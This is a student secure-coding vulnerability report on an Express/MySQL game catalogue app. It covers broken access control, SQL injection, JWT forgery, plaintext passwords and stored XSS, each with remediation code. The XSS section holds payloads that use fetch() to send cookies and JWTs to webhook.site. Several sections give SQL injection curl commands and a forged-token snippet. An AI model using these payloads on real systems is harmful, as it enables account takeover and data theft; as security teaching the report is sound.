---
title: ST2515 Secure Vulnerability Analysis Report
authors:
  - Nachiketh Reddy Y (A01, A09)
  - Mike Franco Abat (A03)
  - Sitt Naing (A04)
  - Keefe Chen Lin Li (A07, A02)
module: ST2515 Secure Coding
date: June 2026
submission: 29 June 2026
---

# ST2515 — Secure Vulnerability Analysis Report

## SP Games Web Application — Consolidated OWASP Assessment

---

## 1. Executive Summary

This consolidated report documents a full security assessment of the **SP Games** game catalogue application (`turbo-funicular`). The stack is Node.js/Express (port **8081**), a static HTML/CSS/JavaScript frontend, MySQL database `sp_games`, and JWT authentication.

The team identified **fourteen distinct vulnerabilities** across six OWASP Top 10 2021 categories. Before remediation, the combined risk was **critical**: an unauthenticated attacker could create admin accounts, read plaintext passwords, inject SQL, forge JWTs, bypass frontend-only controls, and operate without audit trails.

| OWASP | Author | Findings | Severity |
|-------|--------|----------|----------|
| **A01** Broken Access Control | Nachiketh | 4 | Critical |
| **A04** Insecure Design | Sitt | 2 | Critical / High |
| **A03** Injection | Mike | 3 | High / Medium |
| **A07** Auth Failures | Keefe | 3 | High / Medium |
| **A02** Cryptographic Failures | Keefe | 1 | High |
| **A09** Logging & Monitoring | Nachiketh | 1 (5 sub-issues) | High |

**Remediation status:** Server-side access control, SQL parameterisation, JWT secret externalisation, structured audit logging, and enumeration fixes are applied in the repository. Password bcrypt hashing, HTTPS enforcement, and httpOnly cookie migration remain recommended follow-up work.

---

## 2. Assessment Methodology

| Item | Detail |
|------|--------|
| Backend | `Assignment/BackEndServer` — Express API, port **8081** |
| Frontend | `Assignment/FrontEndServer/Public` — static HTML/JS |
| Database | MySQL `sp_games` |
| API testing | Bruno — `API-Testing/opencollection.yml` |
| Test accounts | John (Admin) `John@gmail.com` / `abc123`; Terry (Customer) `terry@gmail.com` / `abc123` |
| Evidence | `Assets/Nachiketh/`, `Assets/Mike/`, `Assets/Sitt/` |

Each finding below uses the course **seven-part structure**:

1. Vulnerability & type of flaw  
2. Exploitation (proof of concept)  
3. Database storage  
4. Affected code (with location)  
5. Recommendations & fix code  
6. Testing process  
7. Tools used  

---

# Part I — OWASP A01: Broken Access Control

**Author:** Nachiketh Reddy Y

### A01 overview

Four Broken Access Control findings documented below.

A security assessment of the game catalogue web application (Express.js API on port **8081**, MySQL database `sp_games`, JWT authentication) revealed **four critical-to-high vulnerabilities** under OWASP Top 10 2021 category **A01 — Broken Access Control**. Together, these flaws allowed unauthenticated or low-privilege attackers to administer the entire system, read sensitive credentials, manipulate the database through injection, and forge admin tokens.

| Item | Detail |
|------|--------|
| **Overall risk** | Critical (before remediation) |
| **Impact** | Full confidentiality, integrity, and availability of user accounts, games, categories, platforms, and reviews |
| **Affected components** | `controller/app.js`, `model/users.js`, `model/game.js`, `config.js`, `auth/verifyToken.js` |
| **Remediation status** | Code fixes applied; password hashing and post-fix screenshot evidence still pending |

**Key findings:**

1. **Missing authentication and authorisation** — sensitive CRUD endpoints ran with no server-side access control; admin UI relied on client-side CSS only.
2. **Plaintext password exposure** — `GET /users` returned every user's password in the JSON response; passwords are stored unhashed in MySQL.
3. **SQL injection** — user input was interpolated directly into SQL strings instead of bound parameters.
4. **Hardcoded JWT secret** — the signing key `Assignment2key` was embedded in source code, enabling token forgery.

---

## Finding 1 — Missing Authentication & Authorisation on API Endpoints

### 1. Vulnerability & Type of Flaw


The application suffers from **Broken Access Control (A01)**. Sensitive API routes — user management, game CRUD, category/platform administration — were registered **without** `verifyToken` or role-checking middleware. Only `/CheckRole` used JWT verification, and no endpoint enforced admin vs customer roles.

The admin dashboard (`admin.html`) applied a CSS `locked` class when the user was not an admin. That is a presentation-layer hint, not a security boundary. Removing the class in browser DevTools restored full interactivity without the server granting access.

Registration also accepted a client-supplied `type` field, so any caller could escalate to `admin` at account creation time.

| Attribute | Value |
|-----------|-------|
| **CVSS 3.1** | 9.8 (Critical) |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

### Mechanism of Action

1. **Unprotected routes:** `GET /users`, `POST /users`, `DELETE /game/:id`, and similar endpoints processed requests with no `Authorization` header check.
2. **Client-trusted roles:** `POST /users` stored whatever `type` value the client sent — including `"admin"`.
3. **Client-side admin gate:** The frontend hid admin controls with CSS; the API never verified the caller's role.

---

### 2. Exploitation

### Step 1 — Enumerate unprotected endpoints

Using Bruno (`API-Testing/opencollection.yml`), most requests succeeded without an `Authorization` header. The collection exposed the full attack surface: user CRUD, game delete, category/platform create.

```http
GET /users HTTP/1.1
Host: localhost:8081
```

**Expected before fix:** `200 OK` with full user list — no token required.

![Figure 1.1 — Bruno API collection: most endpoints need no Authorization header](../../Assets/Nachiketh/a01/01%20-APITesting.png)

![Figure 1.2 — Admin-only URLs exposed in the collection](../../Assets/Nachiketh/a01/09-Admin%20URLs.png)

### Step 2 — Create an admin account without authentication

An attacker registers with an elevated role by supplying `type` in the JSON body:

```http
POST /users HTTP/1.1
Host: localhost:8081
Content-Type: application/json

{
  "username": "hacker",
  "email": "hacker@test.com",
  "password": "hack",
  "type": "admin"
}
```

**Response before fix:** `201 Created` — a new admin account exists with zero authentication.

![Figure 1.3 — Bruno: admin account created without authentication (201)](../../Assets/Nachiketh/a01/11-Brunocancreate%20an%20account%20ad%20admon.png)

### Step 3 — Delete a game without authentication

```http
DELETE /game/14 HTTP/1.1
Host: localhost:8081
```

**Response before fix:** `204 No Content` — game row removed from the `game` table.

![Figure 1.4 — Bruno: DELETE /game/14 succeeds with no token (204)](../../Assets/Nachiketh/a01/12-Anyonecandeletegames.png)

### Step 4 — Bypass client-side admin lock

1. Open `admin.html` in the browser.
2. Open DevTools → Elements.
3. Remove the `locked` class from the admin container.

The admin UI becomes fully interactive. Any subsequent API call still succeeds because the backend does not enforce role checks.

![Figure 1.5 — DevTools: removing the CSS `locked` class unlocks the admin UI](../../Assets/Nachiketh/a01/10%20-%20Insecure%20Browser%20tools.png)

---

### 3. Database Storage

Without server-side access control, every table was reachable through the API:

| Table | Risk |
|-------|------|
| `users` | Create admin accounts, read all rows |
| `game` | Insert, update, or delete catalogue entries |
| `category`, `platform` | Modify taxonomy data |
| `review` | Post reviews attributed to arbitrary user IDs |

---

### 4. Affected Code (with Location)

**Before:** routes had no middleware.

```javascript
// Vulnerable pattern (original assignment code)
app.get('/users', function (req, res) { /* ... */ });
app.post('/users', function (req, res) {
    var type = req.body.type;  // attacker-controlled role
    /* ... */
});
app.delete('/game/:id', function (req, res) { /* ... */ });
```

**After fix** — `controller/app.js`:

```javascript
var verifyToken = require('../auth/verifyToken.js');
var requireAdmin = require('../auth/requireAdmin.js');

app.get('/users', verifyToken, requireAdmin, function (req, res) { /* ... */ });

app.post('/users', verifyToken, requireAdmin, function (req, res) {
    var type = 'user';  // never trust client-supplied role
    /* ... */
});

app.delete('/game/:id', verifyToken, requireAdmin, function (req, res) { /* ... */ });
```

**New middleware** — `auth/requireAdmin.js`:

```javascript
function requireAdmin(req, res, next) {
    if (String(req.type || '').toLowerCase() !== 'admin') {
        res.status(403);
        return res.json({ auth: false, message: 'Admin access required!' });
    }
    next();
}
```

`verifyToken` decodes the JWT and attaches `req.userid` and `req.type` for downstream checks.

**Vulnerable route registrations** — `controller/app.js` (before fix):


![Figure 1.6b — Code: requireAdmin import added to app.js (line 14)](../../Assets/Nachiketh/a01/code/controller_app.js-_14.png)
![Figure 1.6 — Code: GET /users with no middleware (lines 216–241)](../../Assets/Nachiketh/a01/code/controller_app.js-_216-241.png)

![Figure 1.7 — Code: POST /users accepts client-supplied type (lines 244–302)](../../Assets/Nachiketh/a01/code/controller_app.js-_244-302.png)

![Figure 1.8 — Code: GET /users/:userid — no auth (lines 305–331)](../../Assets/Nachiketh/a01/code/controller_app.js-_305-331.png)

![Figure 1.9 — Code: POST /category — no auth (lines 334–381)](../../Assets/Nachiketh/a01/code/controller_app.js-_334-381.png)

![Figure 1.10 — Code: POST /platform — no auth (lines 384–429)](../../Assets/Nachiketh/a01/code/controller_app.js-_384-429.png)

![Figure 1.11 — Code: POST /game — no auth (lines 432–495)](../../Assets/Nachiketh/a01/code/controller_app.js-_432-495.png)

![Figure 1.12 — Code: DELETE /game/:id — no auth (lines 526–551)](../../Assets/Nachiketh/a01/code/controller_app.js-_526-551.png)

![Figure 1.13 — Code: POST review — no user-ID check (lines 554–582)](../../Assets/Nachiketh/a01/code/controller_app.js-_554-582.png)


![Figure 1.15 — Backend console: no security audit output](../../Assets/Nachiketh/a01/08-Consolecoammnd.png)
![Figure 1.14 — Code: login handler leaks errors to client (lines 123–153)](../../Assets/Nachiketh/a01/code/controller_app.js-_123-153.png)

---

### 5. Recommendations & Fix Code

### 6. Testing Process

| Test | Before fix | After fix |
|------|------------|-----------|
| `GET /users` — no token | `200` + data | **403** `Not authorized!` |
| `DELETE /game/14` — no token | `204` | **403** |
| `POST /users` with `"type":"admin"` — no token | `201` admin created | **403** |
| `GET /users` — Terry (customer) token | `200` | **403** `Admin access required!` |
| `GET /users` — John (admin) token | `200` | **200** (authorised) |

Post-fix screenshots: save to `Assets/Nachiketh/a01-after/` per [postfix-screenshots guide](../guides/postfix-screenshots.md).

---

## Finding 2 — User Data Exposure with Plaintext Passwords

### 1. Vulnerability & Type of Flaw


**Broken Access Control combined with Sensitive Data Exposure.** The `GET /users` endpoint returned every column from the `users` table, including the `password` field. Passwords are stored and compared as plain strings — no bcrypt or hashing on insert or login.

| Attribute | Value |
|-----------|-------|
| **CVSS 3.1** | 9.1 (Critical) |

### Mechanism of Action

1. **Over-fetching:** The SQL `SELECT` included `password` and the API serialised it into JSON.
2. **No access gate:** Before the A01 fix, any caller could invoke `GET /users`.
3. **Plaintext storage:** Login compared `req.body.password` directly against the database value.

---

### 2. Exploitation

### Step 1 — Fetch all users with passwords

```http
GET /users HTTP/1.1
Host: localhost:8081
```

**Response before fix (excerpt):**

```json
[
  {
    "userid": 1,
    "username": "Alex",
    "email": "Alex@gmail.com",
    "password": "abc123",
    "type": "user"
  }
]
```

![Figure 2.1 — Bruno: GET /users returns the full user list with no auth](../../Assets/Nachiketh/a01/02%20-%20ExposedUsersOnPort8001.png)

![Figure 2.2 — Response JSON: plaintext passwords visible for every user](../../Assets/Nachiketh/a01/03%20-%20PasswordsUnhashed.png)

### Step 2 — Reuse exposed credentials

```http
POST /users/login HTTP/1.1
Host: localhost:8081
Content-Type: application/json

{"email":"Alex@gmail.com","password":"abc123"}
```

**Response:** `200 OK` with a valid JWT — account takeover without brute force.

![Figure 2.3 — Bruno: login as Alex using credentials from GET /users](../../Assets/Nachiketh/a01/04%20-%20LogInasAlex.png)

![Figure 2.4 — Alex's password confirmed in the exposed user record](../../Assets/Nachiketh/a01/05%20-%20ExposedPassword.png)

![Figure 2.5 — Full data exposure: userid, email, password, and role in one response](../../Assets/Nachiketh/a01/13-Exposure.png)

---

### 3. Database Storage

```sql
-- users.password stored as VARCHAR(255), plaintext
INSERT INTO users (username, email, password, type, ...)
VALUES ('Alex', 'Alex@gmail.com', 'abc123', 'user', ...);
```

| Column | Exposure risk |
|--------|---------------|
| `password` | Returned in API JSON; reusable for login |
| `email`, `type` | Supports targeted phishing and privilege mapping |

---

### 4. Affected Code (with Location)

**Before** — `model/users.js`:

```javascript
var getUserSql = `select userid, username, email, password, type, profile_pic_url,
                    DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at FROM users`;
```

**After fix** — password removed from all `SELECT` queries; endpoint gated by admin JWT:

```javascript
var getUserSql = `select userid, username, email, type, profile_pic_url,
                    DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at FROM users`;
```

```javascript
app.get('/users', verifyToken, requireAdmin, function (req, res) { /* ... */ });
```

![Figure 2.6 — Code: getUser SELECT includes password column (users.js line 28)](../../Assets/Nachiketh/a01/code/model/user.js%20:28.png)

![Figure 2.7 — Code: loginUser stores and compares plaintext passwords (users.js lines 123–171)](../../Assets/Nachiketh/a01/code/model/user.js%20:123-171.png)

**Remaining work:** hash passwords with bcrypt on `insertUser` and use `bcrypt.compare` on login.

---

### 5. Recommendations & Fix Code

### 6. Testing Process

| Test | Before fix | After fix |
|------|------------|-----------|
| `GET /users` response shape | Includes `password` key | No `password` field |
| Unauthenticated `GET /users` | `200` | **403** |
| Authenticated admin `GET /users` | Passwords visible | User metadata only |

---

## Finding 3 — SQL Injection in Database Queries

### 1. Vulnerability & Type of Flaw


**Injection (classified under A01 in this assessment).** Original queries built SQL with template-literal interpolation (`${userid}`, `'${title}'`) instead of bound `?` placeholders. The database engine could not distinguish attacker-supplied syntax from intended query structure.

| Attribute | Value |
|-----------|-------|
| **CVSS 3.1** | 9.8 (Critical) |

### Mechanism of Action

1. **String concatenation:** User input became part of the SQL text.
2. **Logic alteration:** Payloads like `1 OR 1=1` broadened `WHERE` clauses.
3. **Error leakage:** Malformed queries triggered `console.log(err)` dumping full `ER_*` messages (also an A09 issue — see [nachiketh-report-a09.md](nachiketh-report-a09.md)).

---

### 2. Exploitation

### Step 1 — Injection via user ID parameter

```http
GET /users/1%20OR%201=1 HTTP/1.1
Host: localhost:8081
```

**Before fix:** the query became:

```sql
SELECT ... FROM users WHERE userid = 1 OR 1=1;
```

All user rows were returned — including plaintext passwords when the vulnerable `SELECT` still included that column.

![Figure 3.1 — Bruno: GET /users/1 OR 1=1 returns all users (SQLi PoC)](../../Assets/Nachiketh/a01/14-SQL%20Injection.png)

### Step 2 — Injection via game creation fields

A crafted `title` in `POST /game` could break out of the SQL string and append arbitrary clauses.

---

### 3. Database Storage

MySQL executed attacker-controlled strings as part of query structure. No separation existed between SQL code and user data at the application layer.

---

### 4. Affected Code (with Location)

**Before** — `model/users.js`:

```javascript
var getUserByUserIDSql = `... FROM users where userid = ${userid};`;
dbConn.query(getUserByUserIDSql, function (err, results) { /* ... */ });
```

**After fix:**

```javascript
var getUserByUserIDSql = `... FROM users where userid = ?;`;
dbConn.query(getUserByUserIDSql, [userid], function (err, results) { /* ... */ });
```

**Before** — `model/game.js`:

```javascript
var insertGameSql = `INSERT INTO game (title, ...) VALUES ('${title}', ...);`;
```

**After fix:**

```javascript
var insertGameSql = `INSERT INTO game (title, game_description, year, game_image) VALUES (?, ?, ?, ?);`;
dbConn.query(insertGameSql, [title, game_description, year, game_image.buffer], ...);
```

The same `?` placeholder pattern was applied across all model files.

![Figure 3.2 — Code: getUserByUserid interpolates userid (users.js lines 100–116)](../../Assets/Nachiketh/a01/code/model/user.js%20:100-116.png)

![Figure 3.3 — Code: insertGame interpolates title/description/year (game.js lines 144–176)](../../Assets/Nachiketh/a01/code/model/game.js%20:144-176.png)

![Figure 3.4 — Code: updateGame interpolates all fields; missing quote on gameID (game.js lines 291–322)](../../Assets/Nachiketh/a01/code/model/game.js%20:291-322.png)

---

### 5. Recommendations & Fix Code

### 6. Testing Process

| Test | Before fix | After fix |
|------|------------|-----------|
| `GET /users/1 OR 1=1` | All users returned | Empty or single literal match |
| `POST /game` with SQL in `title` | Query manipulation possible | Payload stored as literal string or rejected |
| SQL error in API response | Full query details possible | Generic `Internal Server Error` JSON |

---

## Finding 4 — Hardcoded JWT Signing Secret

### 1. Vulnerability & Type of Flaw


**Cryptographic Failure (A01-related).** The JWT signing key was hardcoded in `config.js` as `Assignment2key`. Anyone with source access — or who guessed the assignment default — could mint valid admin tokens.

| Attribute | Value |
|-----------|-------|
| **CVSS 3.1** | 7.5 (High) |

### Mechanism of Action

1. **Static secret:** `jwt.sign` and `jwt.verify` both used the same embedded string.
2. **Forgery:** An attacker signs arbitrary claims (`userid`, `type: 'admin'`) offline.
3. **Bypass:** Forged tokens pass `verifyToken` and satisfy `requireAdmin`.

---

### 2. Exploitation

```javascript
const jwt = require('jsonwebtoken');
const forged = jwt.sign(
    { userid: 999, type: 'admin' },
    'Assignment2key',
    { expiresIn: 86400 }
);
```

```http
GET /users HTTP/1.1
Host: localhost:8081
Authorization: Bearer <forged>
```

**Before fix:** `200 OK` — full user list returned under a forged admin identity.

![Figure 4.1 — Bruno: obtain a legitimate JWT after login (baseline token)](../../Assets/Nachiketh/a01/05.1%20-%20GettingJWT.png)

![Figure 4.2 — Forging a new JWT with `type: admin` using the known secret](../../Assets/Nachiketh/a01/06%20-%20Changing%20JWT.png)

![Figure 4.3 — Bruno: forged admin token accepted on a protected endpoint](../../Assets/Nachiketh/a01/07%20-%20JWTChangeAccepted.png)

---

### 4. Affected Code (with Location)

**Before** — `config.js`:

```javascript
var secret = 'Assignment2key';
module.exports.key = secret;
```

![Figure 4.4 — Code: hardcoded signing key in config.js](../../Assets/Nachiketh/a01/code/model/config.js.png)

![Figure 4.5 — Code: verifyToken.js uses config.key to verify any signed token](../../Assets/Nachiketh/a01/code/model/verify.js.png)

**After fix:**

```javascript
var secret = process.env.JWT_SECRET;
if (!secret) {
    console.error('FATAL: JWT_SECRET environment variable is not set.');
    process.exit(1);
}
module.exports.key = secret;
```

Set `JWT_SECRET` in `.env` locally and in a secrets manager for production. The server refuses to start if the variable is missing.

---

### 5. Recommendations & Fix Code

### 6. Testing Process

| Test | Before fix | After fix |
|------|------------|-----------|
| Token signed with `Assignment2key` | Accepted | **403** when env secret differs |
| Server start without `JWT_SECRET` | Starts normally | **Exits with FATAL error** |

---

# Part II — OWASP A04: Insecure Design

**Author:** Sitt Naing

Two design flaws share the same root cause: the application trusted the client to enforce security.

---

## Finding 5 — Frontend-Only Admin Access Control

### 1. Vulnerability & Type of Flaw

**Type:** OWASP A04 — Insecure Design (client-side-only authorization)

**CVSS 3.1:** 9.8 (Critical)

Admin pages call `/CheckRole` in browser JavaScript. Privileged backend routes originally had no `verifyToken` or `requireAdmin` middleware.

![Figure 5.1 — Frontend checkAdmin() in addNewCategory.html](../../Assets/Sitt/a04/01-frontend-checkadmin.png)

![Figure 5.2 — Before fix: admin routes without middleware](../../Assets/Sitt/a04/02-before-unprotected-admin-routes.png)

![Figure 5.3 — After fix: verifyToken + requireAdmin](../../Assets/Sitt/a04/03-fixed-admin-middleware.png)

### 2. Exploitation

```http
POST /category HTTP/1.1
Host: localhost:8081
Content-Type: application/json

{"catname":"BypassCategory","description":"Created without auth"}
```

**Before fix:** `201 Created` for category, platform, game create, and game delete — no token required.

![Figure 5.4 — Direct API bypass request](../../Assets/Sitt/a04/06-direct-api-bypass-request.png)

### 3. Database Storage

Tables `category`, `platform`, `game`, `game_platform`, `game_category` — unauthorised writes and deletes.

### 4. Affected Code (with Location)

**File:** `addNewCategory.html` — `checkAdmin()` (UX only)

**File:** `controller/app.js` — before: `app.post('/category', function...)`; after: `verifyToken, requireAdmin`

### 5. Recommendations & Fix Code

Server-side middleware on every privileged route. Frontend checks are usability only.

### 6. Testing Process

| Test | Before | After |
|------|--------|-------|
| POST /category no token | 201 | 403 |
| DELETE /game/:id no token | 204 | 403 |

### 7. Tools Used

curl, Bruno, Browser DevTools, VS Code

---

## Finding 6 — Client-Controlled Role Assignment During Registration

### 1. Vulnerability & Type of Flaw

**Type:** OWASP A04 — Insecure Design

**CVSS 3.1:** 8.1 (High)

Backend accepted `req.body.type` from registration — attackers self-assigned Admin.

![Figure 6.1 — Client-controlled type in registration](../../Assets/Sitt/a04/04-client-controlled-role.png)

![Figure 6.2 — Fixed server-side role assignment](../../Assets/Sitt/a04/05-fixed-server-role.png)

### 2. Exploitation

```json
{"username":"attacker_admin","email":"a@x.com","password":"p","type":"Admin"}
```

### 3. Database Storage

`users.type` column — must be server-assigned.

### 4. Affected Code (with Location)

`register.html` sends `type`; `app.post('/users')` stored `req.body.type`. Fixed: `var type = 'user'`.

### 5. Recommendations & Fix Code

Remove type from public forms; admin-only user creation route.

### 6. Testing Process

Register with type Admin → before: admin account; after: 403 or role ignored.

### 7. Tools Used

HTTP tampering, MySQL schema review, VS Code

# Part III — OWASP A03: Injection

**Author:** Mike Franco Abat

### Finding 7: SQL Injection in `GET /users/:userid`

**Type of flaw:** SQL Injection — unsafe string interpolation allows attacker-controlled input to manipulate the database query structure.

**Location:**
- `Assignment/BackEndServer/controller/app.js` lines 308–320
- `Assignment/BackEndServer/model/users.js` lines 87–103

**Vulnerable code snippet:**

```javascript
// controller/app.js — userid taken from URL with no validation
app.get('/users/:userid', function (req, res) {
    var userid = req.params.userid;

    userDB.getUserByUserid(userid, function (err, results) {
        if (err) {
            console.log(err);
            res.status(500).send(err);
        } else {
            res.status(200).send(results);
        }
    });
});
```

```javascript
// model/users.js — userid dropped directly into the SQL string
var getUserByUserIDSql = `select userid, username, email, password, type, profile_pic_url,
                            DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at
                          FROM users where userid = ${userid};`;
```

**Why this is vulnerable:**
The `userid` value from the URL path parameter is inserted directly into the SQL string using a template literal (`${userid}`) without any parameterization, type validation, or sanitization. The value is treated as raw SQL text, so an attacker can supply SQL syntax and alter the structure of the query. The endpoint is also entirely public — it requires no authentication token.

**How it can be exploited:**

**Step 1 — Confirm the injection point (force a SQL error):**

Sending a single quote breaks the SQL syntax. The server returns a raw MySQL error, confirming input is interpreted as SQL:
```bash
curl "http://localhost:8081/users/'"
```
Expected response: HTTP 500 with a MySQL syntax error leaking internal query structure.

**Step 2 — Dump all users with a tautology:**
```bash
curl "http://localhost:8081/users/1%20OR%201=1"
```
Resulting SQL:
```sql
SELECT userid, username, email, password, type, profile_pic_url, ...
FROM users WHERE userid = 1 OR 1=1;
```
Every row is returned — including all plain-text passwords.

**Step 3 — Target a specific account by email:**
```bash
curl "http://localhost:8081/users/1%20OR%20email='admin@example.com'"
```

**Step 4 — Full account takeover chain:**

With passwords from Step 2, the attacker replays credentials against the login endpoint:
```bash
curl -X POST http://localhost:8081/users/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"dumped_password"}'
```
The server returns a valid JWT token granting full admin access.

**Impact:**
- All user records including plain-text passwords exposed to any unauthenticated attacker
- Immediate account takeover without any cracking step
- Admin credentials may be among the exposed records, enabling full application compromise
- Breach of user confidentiality

**Tools used:** Manual code review, browser navigation to injected URL, Postman for structured payload testing

**Recommendation:**
The fix is to use a parameterized query and remove the password field from the response unless the endpoint explicitly needs it.

**Fixed code:**

```javascript
// model/users.js — parameterized query, password removed from SELECT
var getUserByUserIDSql = `
    SELECT userid, username, email, type, profile_pic_url,
           DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at
    FROM users
    WHERE userid = ?;
`;
dbConn.query(getUserByUserIDSql, [userid], function (err, results) {
    dbConn.end();
    if (err) { return callback(err, null); }
    return callback(null, results);
});
```


**Best Secure Coding Practices:**
- Always use parameterized queries or prepared statements. Never interpolate user input into SQL strings.
- Validate and type-check all inputs at the controller layer before they reach the model. A `userid` should always be coerced to an integer and rejected if not a valid number.
- Remove sensitive columns such as `password` from `SELECT` statements in any query whose results are sent to the client.

---

## A03 — Injection (Brief)

### Finding 2: Stored XSS via Review Content Rendered into `innerHTML`

**Type of flaw:** Stored Cross-Site Scripting (XSS) — user-supplied review content is persisted to the database and later inserted into the DOM without sanitization, allowing injected scripts to execute in every visitor's browser.

**Location:**
- `Assignment/FrontEndServer/Public/newGame-Detail.html` lines 92–103 (`renderReviews` function)
- `Assignment/BackEndServer/controller/app.js` — `POST /users/:uid/game/:gid/review` (no input validation on `content`)

**Vulnerable code snippet:**

```javascript
// newGame-Detail.html — renderReviews()
function renderReviews(reviews) {
    reviews.forEach(r => {
        const div = document.createElement('div');
        div.innerHTML = `
            <strong>${r.username || 'User'}</strong>
            <div class="muted small">${r.created_at || ''} • Rating: ${r.rating || ''}</div>
            <p class="mt-2">${r.content || ''}</p>
        `;
        out.appendChild(div);
    });
}
```

`r.content` is retrieved from the database and inserted directly into `innerHTML` with no escaping. Any HTML or script tags stored in the database will be interpreted and executed by the browser.

**Impact:** An attacker submits a review via Postman with escalating payloads in the `content` field:

**Basic confirmation:**
```json
{ "content": "<script>alert('XSS')</script>", "rating": 5 }
```

**Cookie steal:**
```json
{ "content": "<img src=x onerror=\"fetch('https://webhook.site/YOUR-ID?c='+document.cookie)\">", "rating": 5 }
```

**JWT token steal (most impactful):**
```json
{ "content": "<img src=x onerror=\"fetch('https://webhook.site/YOUR-ID?t='+localStorage.getItem('Token'))\">", "rating": 5 }
```

The JWT steal is the strongest demo: open [webhook.site](https://webhook.site), paste your URL into the payload, submit the review, then visit the game page logged in as a victim in another tab. The victim's JWT arrives at webhook.site in real time — paste it into Postman as `Authorization: Bearer <token>` for immediate account takeover. Because the payload is stored in the database, this is a **persistent** attack affecting every future visitor.

**Recommendation:**
Replace `innerHTML` with DOM methods that set text via `textContent`. Unlike `innerHTML`, `textContent` never interprets its value as HTML — injected tags cannot execute regardless of what the database contains.

**Fixed code:**

```javascript
// Updated renderReviews — textContent used for all dynamic values
function renderReviews(reviews) {
    const out = document.getElementById('reviewDisplaySection');
    out.innerHTML = '';
    reviews.forEach(r => {
        const div = document.createElement('div');
        div.className = 'card p-3 mb-3';

        const wrapper = document.createElement('div');
        wrapper.className = 'd-flex gap-3';

        const img = document.createElement('img');
        img.src = 'data:image/jpeg;base64,' + (r.profile_pic_url || '');
        img.style.cssText = 'width:64px;height:64px;object-fit:cover;border-radius:50%';
        img.alt = 'user';

        const info = document.createElement('div');

        const strong = document.createElement('strong');
        strong.textContent = r.username || 'User';

        const meta = document.createElement('div');
        meta.className = 'muted small';
        meta.textContent = (r.created_at || '') + ' • Rating: ' + (r.rating || '');

        const content = document.createElement('p');
        content.className = 'mt-2';
        content.textContent = r.content || '';

        info.appendChild(strong);
        info.appendChild(meta);
        info.appendChild(content);
        wrapper.appendChild(img);
        wrapper.appendChild(info);
        div.appendChild(wrapper);
        out.appendChild(div);
    });
}
```

With this fix, a payload like `<img src=x onerror="...">` stored in `r.content` is displayed as literal text — the browser never parses it as HTML.

**Best Secure Coding Practices:**
- Use `textContent` instead of `innerHTML` whenever displaying plain text. It is safe by default and requires no escaping — the browser cannot interpret anything set via `textContent` as markup.
- Treat all data retrieved from the database as untrusted. It passed through user input at some point and may contain malicious content.
- Validate and sanitize user input at the backend before storage. The review submission endpoint should strip or reject HTML tags before writing to the database, providing defence-in-depth on top of the frontend fix.
- Implement a Content Security Policy (CSP) header as an additional layer so that even a missed fix cannot allow scripts to exfiltrate data.

---

# Part IV — OWASP A07 & A02: Authentication and Cryptographic Failures

**Author:** Keefe Chen Lin Li

---

## Finding 10 — Plaintext Password Storage and Lack of Hashing

### 1. Vulnerability & Type of Flaw

**Type:** OWASP A07 — Identification and Authentication Failures | **CVSS 3.1:** 9.1 (Critical)

Passwords stored and compared as plain strings.

### 2. Exploitation

Database or API exposure reveals `password: password123` directly.

![Figure 10.1 — Plaintext in database](https://github.com/user-attachments/assets/637df0b0-6a13-4145-997b-93c8f948b0f2)

![Figure 10.2 — SQL Workbench](https://github.com/user-attachments/assets/8fee31e8-c8a8-4672-95df-90917641f237)

![Figure 10.3 — Registration sends unhashed password](https://github.com/user-attachments/assets/1a965573-3916-48bc-80db-a430d298f451)

![Figure 10.4 — MySQL Workbench testing](https://github.com/user-attachments/assets/59c0f3cd-9e79-4ad1-a339-38a39dad8a75)

### 3. Database Storage

`users.password` — plaintext before fix; bcrypt hash after.

### 4. Affected Code (with Location)

`model/users.js` — `insertUser`, `loginUser`

### 5. Recommendations & Fix Code

`bcrypt.hash` on insert; `bcrypt.compare` on login.

![Figure 10.5 — Bcrypt fix](https://github.com/user-attachments/assets/36f19f7b-4005-4d8f-9902-a006658c111e)

### 6. Testing Process

DB shows hash prefix `$2a$10$` after fix.

### 7. Tools Used

MySQL Workbench, Postman, DevTools

---

## Finding 11 — Hardcoded JWT Secret Key

### 1. Vulnerability & Type of Flaw

**Type:** OWASP A07 | **CVSS 3.1:** 7.5 (High)

`Assignment2key` in source — forge admin JWTs. *(See also A01 Finding 4.)*

### 2. Exploitation

`jwt.sign({userid:999,type:'admin'},'Assignment2key')`

![Figure 11.1 — JWT secret in config](https://github.com/user-attachments/assets/c9392fb8-ed5d-44b6-a681-11298581a089)

### 3. Database Storage

N/A — application config.

### 4. Affected Code (with Location)

`config.js`

### 5. Recommendations & Fix Code

`process.env.JWT_SECRET`; exit if unset.

### 6. Testing Process

Forged token rejected after secret change.

### 7. Tools Used

VS Code, Postman, Node.js jsonwebtoken

---

## Finding 12 — Session Hijacking via Client-Side Token Storage

### 1. Vulnerability & Type of Flaw

**Type:** OWASP A07 | **CVSS 3.1:** 6.5 (Medium)

JWT in `localStorage` — stealable via XSS.

### 2. Exploitation

`localStorage.getItem("Token")` → replay on `/CheckRole`.

![Figure 12.1 — localStorage exposure](https://github.com/user-attachments/assets/1c32503e-d787-42c4-ab4d-17f1e1193c35)

![Figure 12.2 — DevTools inspection](https://github.com/user-attachments/assets/60543c09-f509-4fc1-a745-a87bf77ffc0f)

### 3. Database Storage

N/A — browser.

### 4. Affected Code (with Location)

Frontend `localStorage.setItem("Token", token)`

### 5. Recommendations & Fix Code

httpOnly secure sameSite cookies.

### 6. Testing Process

Token not readable via JS after cookie migration.

### 7. Tools Used

Chrome DevTools, Postman

---

## Finding 13 — Missing HTTPS Protection

### 1. Vulnerability & Type of Flaw

**Type:** OWASP A02 — Cryptographic Failures | **CVSS 3.1:** 7.4 (High)

HTTP cleartext for login and API calls.

### 2. Exploitation

MITM on `POST http://localhost:8081/users/login`.

![Figure 13.1 — Postman login test](https://github.com/user-attachments/assets/3478ab6d-6a8d-41a1-8106-acbc744f35da)

### 3. Database Storage

N/A — network.

### 4. Affected Code (with Location)

Frontend `fetch("http://localhost:8081/...")`

### 5. Recommendations & Fix Code

TLS, HTTPS URLs, HSTS.

### 6. Testing Process

Traffic encrypted after TLS.

### 7. Tools Used

DevTools Network, Postman

# Part V — OWASP A09: Security Logging & Monitoring Failures

